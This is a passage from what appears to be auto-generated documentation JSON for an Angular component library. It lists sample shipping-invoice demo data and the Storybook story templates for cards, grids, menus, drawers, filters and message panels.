 'allocated': 411595,\n    'total': 549473\n}, {\n    'invoiceNo': 246327302,\n    'voyageNo': 17427,\n    'vesselName': 'China Violet',\n    'allocated': 426753,\n    'total': 406017\n}, {\n    'invoiceNo': 225951335,\n    'voyageNo': 15473,\n    'vesselName': 'Olympic Saxifrage',\n    'allocated': 429650,\n    'total': 413380\n}, {\n    'invoiceNo': 206579573,\n    'voyageNo': 17600,\n    'vesselName': 'False Sun-rose',\n    'allocated': 464983,\n    'total': 474611\n}, {\n    'invoiceNo': 243806520,\n    'voyageNo': 15148,\n    'vesselName': 'Bracted Lousewort',\n    'allocated': 486907,\n    'total': 419416\n}, {\n    'invoiceNo': 248037555,\n    'voyageNo': 16554,\n    'vesselName': 'Beach Strawberry',\n    'allocated': 446762,\n    'total': 543982\n}, {\n    'invoiceNo': 233807782,\n    'voyageNo': 18251,\n    'vesselName': 'Western Bog Yellowcress',\n    'allocated': 485749,\n    'total': 206612\n}, {\n    'invoiceNo': 231399318,\n    'voyageNo': 18647,\n    'vesselName': 'Nevada Pea',\n    'allocated': 416624,\n    'total': 73797\n}, {\n    'invoiceNo': 210265421,\n    'voyageNo': 17334,\n    'vesselName': 'Silver Bird\\'s-foot Trefoil',\n    'allocated': 493556,\n    'total': 485404\n}, {\n    'invoiceNo': 270110020,\n    'voyageNo': 15750,\n    'vesselName': 'Dotted Lancepod',\n    'allocated': 439009,\n    'total': 85163\n}, {\n    'invoiceNo': 203365491,\n    'voyageNo': 15574,\n    'vesselName': 'Arizona Whitefeather',\n    'allocated': 424981,\n    'total': 72976\n}, {\n    'invoiceNo': 258026382,\n    'voyageNo': 17991,\n    'vesselName': 'Rough Blackfoot',\n    'allocated': 412805,\n    'total': 525915\n}, {\n    'invoiceNo': 216800989,\n    'voyageNo': 18938,\n    'vesselName': 'Narrowleaf Wirelettuce',\n    'allocated': 437679,\n    'total': 384426\n}, {\n    'invoiceNo': 224161270,\n    'voyageNo': 15475,\n    'vesselName': 'Utah Sweetvetch',\n    'allocated': 414735,\n    'total': 398700\n}, {\n    'invoiceNo': 224587536,\n    'voyageNo': 16133,\n    'vesselName': 'Palau Horsfieldia',\n    'allocated': 409836,\n    'total': 55599\n}, {\n    'invoiceNo': 200019644,\n    'voyageNo': 16430,\n    'vesselName': 'Cracked Lichen',\n    'allocated': 491135,\n    'total': 400179\n}, {\n    'invoiceNo': 212973644,\n    'voyageNo': 16527,\n    'vesselName': 'California Valerian',\n    'allocated': 465742,\n    'total': 428281\n}, {\n    'invoiceNo': 236726871,\n    'voyageNo': 15145,\n    'vesselName': 'Spear Saltbush',\n    'allocated': 420067,\n    'total': 236753\n}, {\n    'invoiceNo': 262498296,\n    'voyageNo': 16350,\n    'vesselName': 'Rose Globemallow',\n    'allocated': 472387,\n    'total': 270655\n}, {\n    'invoiceNo': 237959767,\n    'voyageNo': 18739,\n    'vesselName': 'Cithara Buckwheat',\n    'allocated': 447466,\n    'total': 358262\n}, {\n    'invoiceNo': 200461954,\n    'voyageNo': 18921,\n    'vesselName': 'Rough Potato',\n    'allocated': 425594,\n    'total': 459497\n}, {\n    'invoiceNo': 266033549,\n    'voyageNo': 16150,\n    'vesselName': 'Distictis',\n    'allocated': 447636,\n    'total': 286350\n}, {\n    'invoiceNo': 289893009,\n    'voyageNo': 18219,\n    'vesselName': 'Piedmont False Pimpernel',\n    'allocated': 474098,\n    'total': 163688\n}, {\n    'invoiceNo': 241320630,\n    'voyageNo': 15558,\n    'vesselName': 'Southern Mexican Sage',\n    'allocated': 431537,\n    'total': 419734\n}, {\n    'invoiceNo': 211404482,\n    'voyageNo': 18502,\n    'vesselName': 'Bearded Sprangletop',\n    'allocated': 458939,\n    'total': 89714\n}, {\n    'invoiceNo': 247917426,\n    'voyageNo': 18238,\n    'vesselName': 'Small-flowered Calycadenia',\n    'allocated': 406198,\n    'total': 351785\n}, {\n    'invoiceNo': 234633032,\n    'voyageNo': 17269,\n    'vesselName': 'Pritchardia',\n    'allocated': 442188,\n    'total': 414638\n}, {\n    'invoiceNo': 216477974,\n    'voyageNo': 15454,\n    'vesselName': 'Thread Lichen',\n    'allocated': 474232,\n    'total': 537142\n}, {\n    'invoiceNo': 201667786,\n    'voyageNo': 15130,\n    'vesselName': 'Margined Stickseed',\n    'allocated': 493253,\n    'total': 364145\n}, {\n    'invoiceNo': 271891491,\n    'voyageNo': 15468,\n    'vesselName': 'Eggleaf Milkwort',\n    'allocated': 457747,\n    'total': 316780\n}, {\n    'invoiceNo': 223744528,\n    'voyageNo': 16074,\n    'vesselName': 'Hall\\'s Mule-ears',\n    'allocated': 439241,\n    'total': 301239\n}, {\n    'invoiceNo': 202936481,\n    'voyageNo': 18868,\n    'vesselName': 'Rinodina Lichen',\n    'allocated': 488291,\n    'total': 504547\n}, {\n    'invoiceNo': 284610720,\n    'voyageNo': 17077,\n    'vesselName': 'Saber Bogmat',\n    'allocated': 417817,\n    'total': 246511\n}, {\n    'invoiceNo': 286535852,\n    'voyageNo': 15935,\n    'vesselName': 'Brodiaea',\n    'allocated': 479989,\n    'total': 276206\n}, {\n    'invoiceNo': 206000446,\n    'voyageNo': 17528,\n    'vesselName': 'Utah Serviceberry',\n    'allocated': 454837,\n    'total': 399887\n}, {\n    'invoiceNo': 283036494,\n    'voyageNo': 16899,\n    'vesselName': 'Lehua Makanoe',\n    'allocated': 452547,\n    'total': 96023\n}, {\n    'invoiceNo': 270371913,\n    'voyageNo': 16886,\n    'vesselName': 'Rim Lichen',\n    'allocated': 439082,\n    'total': 269557\n}, {\n    'invoiceNo': 273513209,\n    'voyageNo': 15570,\n    'vesselName': 'Andrews\\' Rhizomnium Moss',\n    'allocated': 471494,\n    'total': 131750\n}, {\n    'invoiceNo': 215244773,\n    'voyageNo': 17618,\n    'vesselName': 'Lesser Pond Sedge',\n    'allocated': 472422,\n    'total': 505921\n}, {\n    'invoiceNo': 264815411,\n    'voyageNo': 17008,\n    'vesselName': 'Browne\\'s Savory',\n    'allocated': 464834,\n    'total': 420180\n}, {\n    'invoiceNo': 260793904,\n    'voyageNo': 18868,\n    'vesselName': 'Bastard Copperleaf',\n    'allocated': 403983,\n    'total': 190831\n}, {\n    'invoiceNo': 228919503,\n    'voyageNo': 16736,\n    'vesselName': 'Himalayan Cypress',\n    'allocated': 418664,\n    'total': 450233\n}, {\n    'invoiceNo': 225534860,\n    'voyageNo': 18374,\n    'vesselName': 'Fiddleleaf Hawksbeard',\n    'allocated': 495477,\n    'total': 528500\n}, {\n    'invoiceNo': 205039289,\n    'voyageNo': 15221,\n    'vesselName': 'Maui Cyanea',\n    'allocated': 434081,\n    'total': 79021\n}, {\n    'invoiceNo': 219730920,\n    'voyageNo': 18931,\n    'vesselName': 'Garden Sorrel',\n    'allocated': 442584,\n    'total': 193166\n}, {\n    'invoiceNo': 229994865,\n    'voyageNo': 16404,\n    'vesselName': 'Waialeale Dubautia',\n    'allocated': 414377,\n    'total': 195495\n}, {\n    'invoiceNo': 289807557,\n    'voyageNo': 16151,\n    'vesselName': 'Onetooth Woodfern',\n    'allocated': 415673,\n    'total': 202974\n}, {\n    'invoiceNo': 289750833,\n    'voyageNo': 15827,\n    'vesselName': 'Greenland Orange Lichen',\n    'allocated': 416432,\n    'total': 146021\n}, {\n    'invoiceNo': 243948439,\n    'voyageNo': 18154,\n    'vesselName': 'Leafy Reedgrass',\n    'allocated': 441439,\n    'total': 248631\n}, {\n    'invoiceNo': 266718010,\n    'voyageNo': 15322,\n    'vesselName': 'Largeleaf Marshpennywort',\n    'allocated': 436736,\n    'total': 256997\n}, {\n    'invoiceNo': 285338933,\n    'voyageNo': 18884,\n    'vesselName': 'Musk Okra',\n    'allocated': 414918,\n    'total': 475276\n}, {\n    'invoiceNo': 284544908,\n    'voyageNo': 16825,\n    'vesselName': 'Stegonia Moss',\n    'allocated': 486396,\n    'total': 210718\n}, {\n    'invoiceNo': 200951860,\n    'voyageNo': 15681,\n    'vesselName': 'Black Rock Townsend Daisy',\n    'allocated': 437133,\n    'total': 358340\n}, {\n    'invoiceNo': 248838992,\n    'voyageNo': 18254,\n    'vesselName': 'Kern Canyon Clarkia',\n    'allocated': 414245,\n    'total': 164454\n}, {\n    'invoiceNo': 274109340,\n    'voyageNo': 18252,\n    'vesselName': 'Squarrose Knapweed',\n    'allocated': 408814,\n    'total': 159690\n}, {\n    'invoiceNo': 219721177,\n    'voyageNo': 16331,\n    'vesselName': 'Lake County Dwarf-flax',\n    'allocated': 496150,\n    'total': 404922\n}, {\n    'invoiceNo': 272212685,\n    'voyageNo': 15395,\n    'vesselName': 'Ferngrass',\n    'allocated': 432853,\n    'total': 191127\n}, {\n    'invoiceNo': 243182762,\n    'voyageNo': 18321,\n    'vesselName': 'Marsh Grass',\n    'allocated': 462472,\n    'total': 452940\n}, {\n    'invoiceNo': 277839539,\n    'voyageNo': 17421,\n    'vesselName': 'Prairie Straw Sedge',\n    'allocated': 406837,\n    'total': 271284\n}, {\n    'invoiceNo': 207952597,\n    'voyageNo': 17197,\n    'vesselName': 'Doublehorn Calicoflower',\n    'allocated': 477735,\n    'total': 400959\n}, {\n    'invoiceNo': 260636315,\n    'voyageNo': 15453,\n    'vesselName': 'Palmer\\'s Goldenrod',\n    'allocated': 450419,\n    'total': 309897\n}, {\n    'invoiceNo': 256449906,\n    'voyageNo': 15189,\n    'vesselName': 'Oregon Checkerbloom',\n    'allocated': 435139,\n    'total': 139814\n}, {\n    'invoiceNo': 230023430,\n    'voyageNo': 15665,\n    'vesselName': 'Duckweed',\n    'allocated': 449282,\n    'total': 209512\n}, {\n    'invoiceNo': 226217229,\n    'voyageNo': 18462,\n    'vesselName': 'Disc Lichen',\n    'allocated': 471214,\n    'total': 58962\n}, {\n    'invoiceNo': 239201753,\n    'voyageNo': 18676,\n    'vesselName': 'Antifever Fontinalis Moss',\n    'allocated': 456585,\n    'total': 146024\n}, {\n    'invoiceNo': 235303844,\n    'voyageNo': 16223,\n    'vesselName': 'Miracle Fruit',\n    'allocated': 467877,\n    'total': 150931\n}, {\n    'invoiceNo': 217943418,\n    'voyageNo': 15418,\n    'vesselName': 'Little Gumweed',\n    'allocated': 494402,\n    'total': 355363\n}, {\n    'invoiceNo': 289788898,\n    'voyageNo': 15038,\n    'vesselName': 'Parish\\'s Oxytheca',\n    'allocated': 464853,\n    'total': 472823\n}, {\n    'invoiceNo': 280499130,\n    'voyageNo': 18914,\n    'vesselName': 'Jelly Lichen',\n    'allocated': 486477,\n    'total': 522679\n}, {\n    'invoiceNo': 223812339,\n    'voyageNo': 18298,\n    'vesselName': 'Evermann\\'s Fleabane',\n    'allocated': 453418,\n    'total': 50034\n}, {\n    'invoiceNo': 226331833,\n    'voyageNo': 17046,\n    'vesselName': 'Munj Sweetcane',\n    'allocated': 442239,\n    'total': 447072\n}, {\n    'invoiceNo': 226842057,\n    'voyageNo': 16491,\n    'vesselName': 'Trichostomum Moss',\n    'allocated': 450732,\n    'total': 471203\n}, {\n    'invoiceNo': 218377093,\n    'voyageNo': 18157,\n    'vesselName': 'Brown Stringybark',\n    'allocated': 441668,\n    'total': 464837\n}, {\n    'invoiceNo': 282690677,\n    'voyageNo': 16864,\n    'vesselName': 'Whorled Milkwort',\n    'allocated': 424456,\n    'total': 241177\n  }]\n  .map(row => ({...row, total: pipe.transform(row.total)}))"
            },
            {
                "name": "scss",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "tools/scripts/copy-assets.ts",
                "type": "",
                "defaultValue": "path.join(src, 'style/**/*')"
            },
            {
                "name": "SingleSelect",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/form/src/lib/sto-select-filter/mat-select-filter.stories.ts",
                "type": "Story<Record<string, unknown>>",
                "defaultValue": "(args) => ( {\n  props: { ...args },\n  template: `\n<mat-card style=\"width: 300px\" class=\"sto-form\" >\n    <mat-form-field  class=\"sto-form__field\" floatLabel=\"always\">\n    <mat-label>Select with filter</mat-label>\n      <mat-select [multiple]=\"false\" [value]=\"selected\">\n        <sto-select-filter (keydown.space)=\"$event.stopPropagation()\"\n                           [isFilter]=\"isFilter\"\n                           [focusIfNoValue]=\"focusIfNoValue\"\n                           [isMulti]=\"false\"\n                           (valueChanges)=\"filteredItems = filter($event, allItems)\"></sto-select-filter>\n        <mat-option *ngFor=\"let opt of filteredItems\"\n                    [value]=\"opt\">{{opt.name}}</mat-option>\n      </mat-select>\n    </mat-form-field>\n</mat-card>`\n} )"
            },
            {
                "name": "src",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "tools/scripts/copy-assets.ts",
                "type": "",
                "defaultValue": "path.join(root, 'libs', 'core', 'src')"
            },
            {
                "name": "StoCard",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/core/src/lib/styles.stories.ts",
                "type": "Story<literal type>",
                "defaultValue": "(args) => ( {\n  props: { ...args },\n  template: `<mat-card [class.sto-card]=\"withStyles\">\n<mat-card-title [class.sto-card__title]=\"withStyles\">Card Title</mat-card-title>\n<mat-card-subtitle [class.sto-card__subtitle]=\"withStyles\">Card Subtitle</mat-card-subtitle>\n<mat-card-content [class.sto-card__content]=\"withStyles\">Card Content In Here</mat-card-content>\n</mat-card>`\n} )"
            },
            {
                "name": "StoContextMenu",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/core/src/lib/sto-directives/directives.stories.ts",
                "type": "",
                "defaultValue": "() => ( {\n  props: {\n    closed: action('Menu closed'),\n    log: action('Active menu info')\n  },\n  template: `<mat-card>\n<mat-card-title>Context menu</mat-card-title>\n  <button\n#overlay=\"stoMenuOverlay\"\n[matMenuTriggerRestoreFocus]=\"false\"\n(menuClosed)=\"closed()\"\nmat-button stoMenuOverlay #trigger=\"matMenuTrigger\" [matMenuTriggerFor]=\"menu\">Menu trigger button</button>\n<br>\n<br>\n<p>\n  Active Menu Index {{ activeMenuInfo }}\n</p>\n<br>\n<br>\n<div style=\"width: 500px; display: flex; justify-content: space-between\">\n<span [menuContext]=\"{index: 0}\" [overlayDirective]=\"overlay\" [menuTrigger]=\"trigger\" stoContextMenu>Context 0</span>\n<span [menuContext]=\"{index: 1}\" [overlayDirective]=\"overlay\" [menuTrigger]=\"trigger\" stoContextMenu>Context 1</span>\n<span [menuContext]=\"{index: 2}\" [overlayDirective]=\"overlay\" [menuTrigger]=\"trigger\" stoContextMenu>Context 2</span>\n<span [menuContext]=\"{index: 3}\" [overlayDirective]=\"overlay\" [menuTrigger]=\"trigger\" stoContextMenu>Context 3</span>\n</div>\n\n<mat-menu [backdropClass]=\"'backdrop-remove'\" [hasBackdrop]=\"false\" #menu=\"matMenu\">\n  <ng-template matMenuContent let-index=\"index\">\n    <button mat-menu-item (click)=\"activeMenuInfo = index; log('index', index, $event)\">Index {{ index }}</button>\n    <button mat-menu-item (click)=\"activeMenuInfo = index; log(1, $event)\">Item 1</button>\n    <button mat-menu-item (click)=\"activeMenuInfo = index; log(2, $event)\">Item 2</button>\n  </ng-template>\n</mat-menu>\n</mat-card>`\n} )"
            },
            {
                "name": "StoDialog",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/core/src/lib/styles.stories.ts",
                "type": "Story<Record<string, unknown>>",
                "defaultValue": "(args) => ( {\n  props: { ...args },\n  template: `<app-dialog-demo [separatorLines]=\"separatorLines\"></app-dialog-demo>`,\n} )"
            },
            {
                "name": "StoGrid",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/core/src/lib/styles.stories.ts",
                "type": "Story<unknown>",
                "defaultValue": "() => ( {\n  template: `\n<div class=\"sto-grid sto-grid--2\" style=\"margin-bottom: 8px;\">\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--2</div>\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--2</div>\n</div>\n<div class=\"sto-grid sto-grid--3\" style=\"margin-bottom: 8px;\">\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--3</div>\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--3</div>\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--3</div>\n</div>\n<div class=\"sto-grid sto-grid--4\" style=\"margin-bottom: 8px;\">\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--4</div>\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--4</div>\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--4</div>\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--4</div>\n</div>\n<div class=\"sto-grid sto-grid--6\" style=\"margin-bottom: 8px;\">\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--6</div>\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--6</div>\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--6</div>\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--6</div>\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--6</div>\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--6</div>\n</div>\n  `,\n} )"
            },
            {
                "name": "StoGrid",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/core/src/lib/sto-directives/directives.stories.ts",
                "type": "",
                "defaultValue": "(args: Record<string, unknown>) => ( {\n  props: { ...args },\n  template: `<mat-card class=\"sto-card\">\n<div style=\"background: white;\" stoGrid [maxWidth]=\"1000\" [breakpoints]=\"breakpoints\">\n<div stoGridColumn style=\"background: lightblue;\">1 (col)</div>\n<div stoGridColumn style=\"background: lightblue;\">2 (col)</div>\n<div stoGridColumn style=\"background: lightblue;\">3 (col)</div>\n<div stoGridColumn style=\"background: lightblue;\">4 (col)</div>\n<div stoGridColumn style=\"background: lightblue;\">5 (col)</div>\n<div stoGridColumn style=\"background: lightblue;\">6 (col)</div>\n<div stoGridColumn [stoGridColumnDouble]=\"true\" style=\"background: lightblue;\">7 (double col)</div>\n<div stoGridColumn [stoGridColumnDouble]=\"true\" style=\"background: lightblue;\">8 (double col)</div>\n<div stoGridColumn [stoGridColumnDouble]=\"true\" stoGridSpacer>9 (double spacer, hidden on 2-col)</div>\n<div stoGridColumn [stoGridColumnDouble]=\"true\" style=\"background: lightblue;\">10 (double col)</div>\n<div stoGridColumn style=\"background: lightblue;\">11 (col)</div>\n<div stoGridColumn stoGridSpacer>12 (spacer, hidden on 1-col)</div>\n<div stoGridColumn style=\"background: transparent;\" class=\"sto-form\"></div>\n<div stoGridColumn stoGridSpacer style=\"background: lightblue;\">13 (col spacer, hidden on 1-col grid)</div>\n<div stoGridColumn stoGridSpacer style=\"background: lightblue;\" [stoGridColumnDouble]=\"true\" >14 (double spacer, hidden on 2-col)</div>\n</div>\n</mat-card>`\n} )"
            },
            {
                "name": "StoTheme",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/core/src/lib/styles.stories.ts",
                "type": "Story<Record<string, unknown>>",
                "defaultValue": "args => ( {\n  props: { ...args, colors: [ 'primary', 'accent', 'warn', 'warning', 'success', 'danger' ] },\n  styles: [\n    `\n    .container { display: flex; }\n    .container > div {\n     flex: 0 1 auto;\n     padding-left: 16px;\n     }\n    `\n  ],\n  template: `\n  <mat-tab-group>\n  <mat-tab label=\"Buttons\">\n    <mat-card class=\"sto-card\">\n    <div *ngFor=\"let color of colors\">\n      <mat-card-subtitle class=\"sto-card__subtitle\">\n    <h2>{{ color }}</h2>\n</mat-card-subtitle>\n    <button mat-button [color]=\"color\">Mat Button</button>\n    <button mat-stroked-button [color]=\"color\">Mat stroked Button</button>\n    <button mat-flat-button [color]=\"color\">Mat flat Button</button>\n    <button mat-raised-button [color]=\"color\">Mat raised Button</button>\n    <button mat-icon-button [color]=\"color\"><mat-icon>home</mat-icon></button>\n</div>\n</mat-card>\n  </mat-tab>\n  <mat-tab label=\"Cards\">\n  <mat-card *ngFor=\"let c of colors\" [ngClass]=\"'mat-' + c\">\n  <mat-card-title>{{ c }}</mat-card-title>\n</mat-card>\n</mat-tab>\n<mat-tab label=\"Text\">\n<mat-card class=\"sto-card\">\n    <div class=\"container\">\n    <div>\n    <p *ngFor=\"let color of colors\" [ngClass]=\"'mat-' + color\">&lt;p&gt; {{ color }}</p>\n</div>\n<div>\n    <span *ngFor=\"let color of colors\" style=\"display: block\" [ngClass]=\"'mat-' + color\">\n    &lt;span&gt; {{ color }}\n</span>\n</div>\n<div>\n    <h2 *ngFor=\"let color of colors\" style=\"display: block\" [ngClass]=\"'mat-' + color\">\n    &lt;h[1|2|3|4|5]&gt; {{ color }}\n</h2>\n</div>\n</div>\n</mat-card>\n</mat-tab>\n</mat-tab-group>\n  `,\n} )"
            },
            {
                "name": "subNavigation",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/drawer/src/lib/sto-navigation/navigation.ts",
                "type": "object",
                "defaultValue": "{\n  'name': 'Application 2',\n  'groups': [\n    {\n      'name': null,\n      'items': [\n        {\n          'icon': 'date_range',\n          'name': 'Section 1',\n          'command': {\n            'type': 'internalLink',\n            'arguments': [\n              '1'\n            ]\n          },\n          'svgIcon': false,\n          'subItems': []\n        },\n        {\n          'icon': 'format_list_bulleted',\n          'name': 'Section 2',\n          'command': {\n            'type': 'internalLink',\n            'arguments': [\n              '2'\n            ]\n          },\n          'svgIcon': false,\n          'subItems': []\n        },\n        {\n          'icon': 'train',\n          'name': 'Section 3',\n          'command': {\n            'type': 'internalLink',\n            'arguments': [\n              '3'\n            ]\n          },\n          'svgIcon': false,\n          'subItems': []\n        },\n        {\n          'icon': 'access_time',\n          'name': 'Section 4',\n          'command': {\n            'type': 'internalLink',\n            'arguments': [\n              '4'\n            ]\n          },\n          'svgIcon': false,\n          'subItems': []\n        },\n        {\n          'icon': 'description',\n          'name': 'Section 5',\n          'command': {\n            'type': 'internalLink',\n            'arguments': [\n              '5'\n            ]\n          },\n          'svgIcon': false,\n          'subItems': []\n        }\n      ],\n      'hasDivider': false,\n      'svgIcon': false,\n      'icon': null\n    },\n    {\n      'name': null,\n      'items': [\n        {\n          'icon': 'train',\n          'name': 'SubSection 1',\n          'command': {\n            'type': 'internalLink',\n            'arguments': [\n              '11'\n            ]\n          },\n          'svgIcon': false,\n          'subItems': []\n        },\n        {\n          'icon': 'person',\n          'name': 'SubSection 2',\n          'command': {\n            'type': 'internalLink',\n            'arguments': [\n              '12'\n            ]\n          },\n          'svgIcon': false,\n          'subItems': []\n        },\n        {\n          'icon': 'business',\n          'name': 'SubSection 3',\n          'command': {\n            'type': 'internalLink',\n            'arguments': [\n              'SubSection 13'\n            ]\n          },\n          'svgIcon': false,\n          'subItems': []\n        },\n        {\n          'icon': 'settings',\n          'name': 'SubSection 4',\n          'command': {\n            'type': 'internalLink',\n            'arguments': [\n              '4'\n            ]\n          },\n          'svgIcon': false,\n          'subItems': []\n        }\n      ],\n      'hasDivider': true,\n      'svgIcon': false,\n      'icon': null\n    }\n  ]\n}"
            },
            {
                "name": "Success",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "type": "Story<StoMessagePanelComponent>",
                "defaultValue": "(args: StoMessagePanelComponent) => {\n  return {\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" color=\"success\" [dismissable]=\"false\" icon=\"info\">Warning Text Content</sto-message-panel>'\n  };\n}"
            },
            {
                "name": "Template",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/datatable/src/lib/swimlane-table.stories.ts",
                "type": "Story<Record<string, unknown>>",
                "defaultValue": "(args: Record<string, unknown>) => {\n  return {\n    props: args,\n    template: `<mat-card>\n<mat-card-title><h2>This replaces StoComplexDatatable and is only here for CSS</h2></mat-card-title>\n<ngx-datatable [loadingIndicator]=\"loading\"\n[footerHeight]=\"40\"\n[selectionType]=\"'single'\"\n[scrollbarV]=\"true\"\n[scrollbarH]=\"horizontalScroll\"\n[style.height.px]=\"height\"\n[rowHeight]=\"rowHeight\"\n[headerHeight]=\"headerHeight\"\n[class.sto-datatable]=\"withCss\"\n[rows]=\"rows\"\n[columns]=\"columns\"></ngx-datatable>\n</mat-card>`\n  };\n}"
            },
            {
                "name": "Template",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/error-handler/src/lib/error-handler.stories.ts",
                "type": "Story<Record<string, unknown>>",
                "defaultValue": "(args: Record<string, unknown> ) => {\n  return {\n    props: args,\n    template: `<next-wrapper></next-wrapper>`,\n  };\n}"
            },
            {
                "name": "Template",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-action-footer/action-footer.stories.ts",
                "type": "Story<StoActionFooterComponent>",
                "defaultValue": "(args: StoActionFooterComponent) => {\n  return {\n    component: StoActionFooterComponent,\n    props: {\n      ...args,\n      save: action('Save'),\n      cancel: action('Cancel')\n    },\n    template: '<sto-action-footer [isLoading]=\"isLoading\" [position]=\"position\" [shouldAddClass]=\"shouldAddClass\"><button mat-flat-button (click)=\"save()\" color=\"primary\">Save</button><button (click)=\"cancel()\" mat-button>Cancel</button></sto-action-footer>'\n  };\n}"
            },
            {
                "name": "Template",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
                "type": "Story<>",
                "defaultValue": "(args: StoAppHeaderComponent) => {\n  return {\n    props: args,\n    template: `<sto-app-header [breadCrumbs]=\"breadCrumbs\" [environmentName]=\"environmentName\" [testEnvironment]=\"testEnvironment\"></sto-app-header>`\n  };\n}"
            },
            {
                "name": "Template",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-filter/filter-panel.stories.ts",
                "type": "Story<>",
                "defaultValue": "(args: StoFilterPanelComponent) => {\n  return {\n    component: StoFilterPanelComponent,\n    props: args,\n    template: `\n      <sto-filter-panel class=\"sto-form\"\n                        [expandable]=\"expandable\"\n                        [expanded]=\"expanded\"\n                        (toggled)=\"toggled()\">\n          <sto-filter-title>{{ title }}</sto-filter-title>\n          <sto-filter-table-actions>\n              <button mat-icon-button>\n                  <mat-icon>add</mat-icon>\n              </button>\n          </sto-filter-table-actions>\n          <div class=\"sto-form\"\n               stoGrid>\n              <mat-form-field floatLabel=\"always\"\n              stoFormField\n                              stoGridColumn>\n                  <mat-label>Field 1</mat-label>\n                  <input matInput>\n              </mat-form-field>\n              <mat-form-field floatLabel=\"always\"\n              stoFormField\n                              stoGridColumn>\n                  <mat-label>Field 2 (multi)</mat-label>\n                  <mat-select [multiple]=\"true\">\n                      <mat-option [value]=\"1\">{{1}}</mat-option>\n                      <mat-option [value]=\"2\">{{2}}</mat-option>\n                      <mat-option [value]=\"3\">{{3}}</mat-option>\n                      <mat-option [value]=\"4\">{{4}}</mat-option>\n                  </mat-select>\n              </mat-form-field>\n              <div stoGridColumn\n                   [stoGridColumnDouble]=\"true\"\n                   stoGridSpacer></div>\n          </div>\n      </sto-filter-panel>`\n  };\n}"
            },
            {
                "name": "Template",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "type": "Story<>",
                "defaultValue": "(args: StoMessagePanelComponent) => {\n  return {\n    component: StoMessagePanelComponent,\n    props: { ...args, dismissed: action('Dismissed') },\n    template: '<sto-message-panel [color]=\"color\" [dismissable]=\"dismissable\" [icon]=\"icon\" (dismissed)=\"dismissed()\">{{ contents }}</sto-message-panel>'\n  };\n}"
            },
            {
                "name": "Template",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/drawer/src/lib/sto-drawer/drawer.stories.ts",
                "type": "Story<StoDrawerComponent>",
                "defaultValue": "(args: StoDrawerComponent) => {\n  return {\n    component: StoDrawerComponent,\n    props: args,\n    template: `\n  <div>\n  <sto-drawer [position]=\"position\" [open]=\"open\" [animation]=\"animation\" [backdrop]=\"backdrop\">\n<sto-drawer-header>\n<div class=\"sto-drawer__header__title\">\n<h2>Title</h2>\n      </div>\n</sto-drawer-header>\n\n<mat-card class=\"sto-card\"><p>Content in drawer</p></mat-card>\n\n<sto-drawer-footer>\n<button mat-button color=\"primary\">Save</button>\n</sto-drawer-footer>\n</sto-drawer>\n\n\n<mat-card class=\"sto-card sto-form\">\n<mat-card-title class=\"sto-card__title\">Content title</mat-card-title>\n</mat-card>\n<mat-card class=\"sto-card sto-form\">\n<mat-card-title class=\"sto-card__title\">Content title</mat-card-title>\n</mat-card>\n</div>\n`,\n\n  };\n}"
            },
            {
                "name": "Template",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/drawer/src/lib/sto-navigation/navigation.stories.ts",
                "type": "Story<>",
                "defaultValue": "(args: StoDrawerComponent) => {\n  const actions = {\n    handleCommand: action('Link pressed'),\n    topsNav: action('Open tops landing'),\n    toggle: action('Switch side'),\n    closeMenu: action('Close menu'),\n  };\n  return {\n    component: StoDrawerComponent,\n    props: { ...args, ...actions, navigation, subNavigation },\n    template: `<div>\n  <sto-drawer [open]=\"open\" [animation]=\"animation\" [backdrop]=\"backdrop\">\n<sto-drawer-header>\n<div class=\"sto-drawer__header__infix\">\n        <button *ngIf=\"activePane === 'right'; else topIcon\"\n                type=\"button\"\n                mat-icon-button\n                (click)=\"toggle(); activePane = 'left'\">\n          <mat-icon>arrow_back</mat-icon>\n        </button>\n        <ng-template #topIcon>\n          <button mat-icon-button\n          type=\"button\"\n          (click)=\"topsNav()\">\n            <mat-icon [class.sto-main-icon--test-environment]=\"testEnvironment\">settings</mat-icon>\n          </button>\n        </ng-template>\n      </div>\n<div class=\"sto-drawer__header__title\">\n        <ng-container 